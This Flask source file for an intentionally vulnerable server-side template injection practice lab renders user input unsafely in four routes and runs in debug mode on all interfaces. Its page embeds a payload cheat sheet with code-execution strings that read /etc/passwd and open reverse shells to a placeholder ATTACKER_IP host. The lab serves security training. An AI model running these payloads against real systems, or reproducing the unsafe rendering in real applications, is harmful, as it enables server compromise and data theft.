from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# Template that processes user input unsafely
BASE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Flask SSTI Lab</title>
    <style>
        body { font-family: monospace; background: #1a1a2e; color: #00ff00; padding: 20px; }
        h1 { color: #ff0066; }
        h2 { color: #ffff00; }
        .vuln { background: #16213e; padding: 15px; margin: 10px 0; border-left: 4px solid #ff0066; }
        input[type=text] { padding: 10px; width: 400px; background: #0f3460; color: #fff; border: 1px solid #00ff00; }
        input[type=submit] { padding: 10px 20px; background: #00ff00; color: #000; border: none; cursor: pointer; }
        input[type=submit]:hover { background: #00cc00; }
        a { color: #00ffff; }
        code { background: #0f3460; padding: 3px 6px; }
        pre { background: #0f3460; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>Flask SSTI Vulnerability Lab</h1>
    <p>Welcome to the Server-Side Template Injection practice environment!</p>
"""

FOOTER_TEMPLATE = """
    <h2>Available Endpoints:</h2>

    <div class="vuln">
        <h3>Basic SSTI</h3>
        <form action="/ssti" method="GET">
            <input type="text" name="name" placeholder="Enter your name" value="guest">
            <input type="submit" value="Submit">
        </form>
        <p>Test with: <code>?name={{7*7}}</code> or <code>?name={{config}}</code></p>
    </div>

    <div class="vuln">
        <h3>Advanced SSTI (Render Template String)</h3>
        <form action="/render" method="GET">
            <input type="text" name="template" placeholder="Enter template" value="Hello {{name}}!">
            <input type="submit" value="Submit">
        </form>
        <p>Direct template injection. Test with: <code>?template={{config.items()}}</code></p>
    </div>

    <div class="vuln">
        <h3>Greeting Generator</h3>
        <form action="/greeting" method="GET">
            <input type="text" name="user" placeholder="Username" value="guest">
            <input type="submit" value="Generate Greeting">
        </form>
        <p>Custom greeting with SSTI in the message.</p>
    </div>

    <div class="vuln">
        <h3>Profile Page</h3>
        <form action="/profile" method="POST">
            <input type="text" name="username" placeholder="Username" value="guest">
            <input type="text" name="bio" placeholder="Bio" value="Security researcher">
            <input type="submit" value="View Profile">
        </form>
        <p>SSTI in profile rendering (POST request).</p>
    </div>

    <h2>SSTI Payload Quick Reference:</h2>
    <h3>Basic Detection:</h3>
    <pre>
{{7*7}}              # Returns 49 if vulnerable
{{config}}           # Shows Flask config
{{''.__class__}}     # Access string class
{{''.__class__.__mro__}}  # Method Resolution Order
{{''.__class__.__mro__[1].__subclasses__()}}  # All subclasses
    </pre>

    <h3>RCE Payloads:</h3>
    <pre>
# Read file:
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}

# Reverse shell:
{{config.__class__.__init__.__globals__['os'].popen('nc -e /bin/sh ATTACKER 4444').read()}}
    </pre>

    <h2>Full Reverse Shell Payload:</h2>
    <pre>
# Step 1: Start listener on attacker: nc -lvnp 4444

# Step 2: Send SSTI payload to victim:
curl "http://target:5000/ssti?name={{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1').read()}}"
    </pre>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(BASE_TEMPLATE + "" + FOOTER_TEMPLATE)

@app.route('/ssti')
def ssti():
    name = request.args.get('name', 'guest')
    template = BASE_TEMPLATE
    template += f"<div class='vuln'><h2>Hello {name}!</h2></div>"
    template += FOOTER_TEMPLATE
    return render_template_string(template)

@app.route('/render')
def render():
    user_template = request.args.get('template', 'Hello guest!')
    try:
        result = render_template_string(user_template)
        return BASE_TEMPLATE + f"<div class='vuln'><h2>Rendered:</h2><pre>{result}</pre></div>" + FOOTER_TEMPLATE
    except Exception as e:
        return BASE_TEMPLATE + f"<div class='vuln'><h2>Error:</h2><pre>{str(e)}</pre></div>" + FOOTER_TEMPLATE

@app.route('/greeting')
def greeting():
    user = request.args.get('user', 'guest')
    message = request.args.get('msg', 'Welcome')
    template = BASE_TEMPLATE
    template += f"<div class='vuln'><h2>{message}!</h2><p>User: {user}</p></div>"
    template += FOOTER_TEMPLATE
    return render_template_string(template)

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    if request.method == 'POST':
        username = request.form.get('username', 'guest')
        bio = request.form.get('bio', 'No bio')
        template = BASE_TEMPLATE
        template += f"<div class='vuln'><h2>Profile: {username}</h2><p>Bio: {bio}</p></div>"
        template += FOOTER_TEMPLATE
        return render_template_string(template)
    else:
        return render_template_string(BASE_TEMPLATE + """
        <div class='vuln'>
            <h2>Create Profile</h2>
            <form method='POST'>
                <input type='text' name='username' placeholder='Username' value='guest'><br><br>
                <input type='text' name='bio' placeholder='Bio' value='Security researcher'><br><br>
                <input type='submit' value='Create Profile'>
            </form>
        </div>
        """ + FOOTER_TEMPLATE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
